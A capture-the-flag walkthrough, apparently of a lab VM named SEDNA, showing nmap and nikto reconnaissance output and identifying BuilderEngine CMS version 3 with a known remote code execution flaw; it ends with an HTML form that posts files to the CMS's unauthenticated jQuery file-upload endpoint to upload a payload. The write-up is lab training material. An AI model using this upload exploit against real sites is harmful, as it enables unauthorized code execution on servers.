This is the second part of the CTF series. This one being medium difficulty with 4 flags.
# RECON

The machine gives us the ip upon boot on the vm as 192.168.1.127, I run an nmap scan to check for open ports and services running and a simple vulnerability scan with nmap.
```
└─# nmap -sV -sC -A -Pn 192.168.1.127   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-13 15:24 +04
Nmap scan report for 192.168.1.127
Host is up (0.0028s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 aac39e80b48115dd60d508ba3fe0af08 (DSA)
|   2048 417fc25dd53a68e4c5d9cc60067693a5 (RSA)
|   256 ef2d6585f83a85c2330b7df9c8922203 (ECDSA)
|_  256 ca363c32e624f9b7b4d41dfcc0da1096 (ED25519)
53/tcp   open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3-Ubuntu
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_Hackers
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp  open  pop3        Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: SASL PIPELINING UIDL TOP AUTH-RESP-CODE STLS CAPA RESP-CODES
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T19:17:14
|_Not valid after:  2026-10-07T19:17:14
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          38726/tcp   status
|   100024  1          39415/tcp6  status
|   100024  1          43970/udp6  status
|_  100024  1          57639/udp   status
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open  imap        Dovecot imapd (Ubuntu)
|_imap-capabilities: more capabilities LOGINDISABLEDA0001 have SASL-IR ENABLE listed LOGIN-REFERRALS ID post-login STARTTLS IDLE LITERAL+ Pre-login IMAP4rev1 OK
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T19:17:14
|_Not valid after:  2026-10-07T19:17:14
445/tcp  open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
993/tcp  open  ssl/imap    Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: capabilities more have SASL-IR ENABLE listed LOGIN-REFERRALS ID post-login AUTH=PLAINA0001 IDLE LITERAL+ Pre-login IMAP4rev1 OK
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T19:17:14
|_Not valid after:  2026-10-07T19:17:14
995/tcp  open  ssl/pop3    Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) PIPELINING UIDL TOP AUTH-RESP-CODE RESP-CODES CAPA USER
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T19:17:14
|_Not valid after:  2026-10-07T19:17:14
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat
MAC Address: 00:0C:29:EC:B9:41 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: SEDNA; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-02-13T11:25:00
|_  start_date: N/A
|_nbstat: NetBIOS name: SEDNA, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-os-discovery: 
|   OS: Unix (Samba 4.1.6-Ubuntu)
|   NetBIOS computer name: SEDNA\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-02-13T06:24:59-05:00
|_clock-skew: mean: 1h39m56s, deviation: 2h53m12s, median: -3s
| smb2-security-mode: 
|   300: 
|_    Message signing enabled but not required

TRACEROUTE
HOP RTT     ADDRESS
1   2.84 ms 192.168.1.127

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.76 seconds
```
While running a nikto scan I decided to check the page source for ip:80 and ip:8080 and robots.txt. IP:8080 gives us information that its run on apache tomcat7 but nothing more could be found after further snooping.
```
└─$ nikto -host 192.168.1.127 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.127
+ Target Hostname:    192.168.1.127
+ Target Port:        80
+ Start Time:         2023-03-05 17:23:06 (GMT4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" contains 1 entry which should be manually viewed.
+ Server may leak inodes via ETags, header found with file /, inode: 65, size: 53fb059bb5bc8, mtime: gzip
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: /files/: Directory indexing found.
+ OSVDB-3092: /files/: This might be interesting...
+ OSVDB-3092: /system/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ 7920 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2023-03-05 17:28:33 (GMT4) (327 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
Going to /license.txt reveals that webapp using the BuilderEngine CMS but no version is given. Further digging in the /themes found using dirb I found a 'description.txt' file which says it runs version 3. A quick search on exploitdb reveals a RCE on the version which allows us to create a file uploader which we can use to upload a payload. We create the following html file next.
```
<html>
<body>
<form method="post" action="http://localhost/themes/dashboard/assets/plugins/jquery-file-upload/server/php/" enctype="multipart/form-data">
	<input type="file" name="files[]" />
	<input type="submit" value="send" />
</form>
</body>
</html>
```
